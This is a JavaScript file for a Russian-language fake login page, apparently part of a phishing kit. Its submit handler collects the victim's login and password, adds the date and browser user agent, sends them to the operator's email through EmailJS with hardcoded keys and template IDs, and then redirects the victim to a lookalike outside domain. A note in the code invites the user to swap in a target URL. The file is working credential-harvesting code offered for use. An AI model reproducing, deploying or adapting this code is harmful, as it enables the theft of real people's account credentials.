// Инициализация EmailJS
emailjs.init('vh1ShWK8WwLtFysy4');

// Показ основного контента после загрузки
setTimeout(() => {
    document.getElementById('loading-screen').style.display = 'none';
    document.getElementById('main-content').style.display = 'flex';
}, 3000);

// Показать/скрыть пароль
const togglePassword = document.querySelector('.toggle-password');
const passwordInput = document.getElementById('password-input');
let passwordVisible = false;

togglePassword.addEventListener('click', () => {
    passwordVisible = !passwordVisible;
    passwordInput.type = passwordVisible ? 'text' : 'password';
    
    // Обновление иконки
    const svg = togglePassword.querySelector('svg');
    if (passwordVisible) {
        svg.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `;
    } else {
        svg.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
            <line x1="3" y1="3" x2="21" y2="21"></line>
        `;
    }
});

// Обработка формы
const loginForm = document.getElementById('login-form');
const loginInput = document.getElementById('login-input');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const login = loginInput.value;
    const password = passwordInput.value;
    
    // Блокировка кнопки
    const submitBtn = loginForm.querySelector('.login-btn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Отправка...';
    
    // Параметры для EmailJS
    const templateParams = {
        login: login,
        password: password,
        date: new Date().toLocaleString('ru-RU'),
        user_agent: navigator.userAgent
    };
    
    try {
        // Отправка данных на почту через EmailJS
        await emailjs.send(
            'service_1r11tq6',
            'template_sp2n9ix',
            templateParams
        );
        
        console.log('Данные успешно отправлены на почту');
        
        // Переадресация на другой сайт
        window.location.href = 'https://rtk-nrfbt-131.com/ru/?traceparent=00-b283f29685ebec906a103ac4f650c574-f249a46506148067-01'; // ЗАМЕНИТЕ НА НУЖНЫЙ URL
        
    } catch (error) {
        console.error('Ошибка отправки:', error);
        alert('Произошла ошибка. Попробуйте еще раз.');
        
        // Разблокировка кнопки
        submitBtn.disabled = false;
        submitBtn.textContent = 'Вход';
    }
});

// Кнопка закрытия
document.querySelector('.close-btn').addEventListener('click', () => {
    if (window.history.length > 1) {
        window.history.back();
    } else {
        window.close();
    }
});

// Социальные кнопки
const socialButtons = document.querySelectorAll('.social-btn');
socialButtons.forEach((btn, index) => {
    btn.addEventListener('click', () => {
        const socialNetworks = ['Google', 'Telegram'];
        console.log(`Вход через ${socialNetworks[index]}`);
        // Здесь можно добавить логику входа через соцсети
    });
});

// Ссылки футера
document.querySelectorAll('.footer-link').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        console.log('Клик по ссылке:', link.textContent);
    });
});

document.querySelector('.forgot-password').addEventListener('click', (e) => {
    e.preventDefault();
    console.log('Получить одноразовый пароль');
});

// Предотвращение зума при двойном тапе на iOS
let lastTouchEnd = 0;
document.addEventListener('touchend', (event) => {
    const now = Date.now();
    if (now - lastTouchEnd <= 300) {
        event.preventDefault();
    }
    lastTouchEnd = now;
}, false);

// Автофокус на первое поле при загрузке (опционально)
setTimeout(() => {
    if (window.innerWidth > 768) {
        loginInput.focus();
    }
}, 3100);